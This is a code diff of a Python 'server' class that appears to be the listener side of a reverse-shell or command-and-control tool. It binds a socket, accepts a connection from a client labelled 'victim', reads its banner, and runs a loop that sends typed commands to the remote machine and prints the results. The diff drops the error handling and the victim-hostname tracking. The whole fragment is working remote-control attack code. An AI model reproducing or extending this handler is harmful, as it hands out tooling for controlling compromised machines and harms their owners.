@@ -34,28 +34,23 @@ class server:
             s = socket.socket()
             s.bind((self.ip, int(self.port)))
             s.listen(5)
-            try:
-                print(colored("Listing on {}:{}...".format(self.ip, self.port), 'green'))
-                client_socket, client_address = s.accept()
-                print(colored("Connection established Client - {}:{}".format(client_address[0], client_address[1]), "green"))
-                client_hostname = client_socket.recv(buffer_size).decode()
-                victim = machine(client_address, client_hostname)
-                banner = client_socket.recv(buffer_size).decode()
-                print("You are now interacting with {} at {}".format(victim.ip, victim.name))
-                print(banner)
-                while True:
-                    command = input('$>')
-                    client_socket.send(command.encode())
-                    if command.lower() == 'exit':
-                        break
-                    results = client_socket.recv(buffer_size).decode()
-                    print(results)
-                client_socket.close()
-                s.close()
-            except:
-                print("\n")
-                print(colored("hanlder shutdown", "red"))
-                pass
+            print(colored("Listing on {}:{}...".format(self.ip, self.port), 'green'))
+            client_socket, client_address = s.accept()
+            print(colored("Connection established Client - {}:{}".format(client_address[0], client_address[1]), "green"))
+            banner = client_socket.recv(buffer_size).decode()
+            print(banner)
+            while True:
+                command = input('$>')
+                client_socket.send(command.encode())
+                if command.lower() == 'exit':
+                    break
+                results = client_socket.recv(buffer_size).decode()
+                print(results)
+            client_socket.close()
+            s.close()
+            print("\n")
+            print(colored("hanlder shutdown", "red"))
+            pass
     def stop(self):
         if self.protocol == 'http':
             os.system("kill {}".format(self.pid))
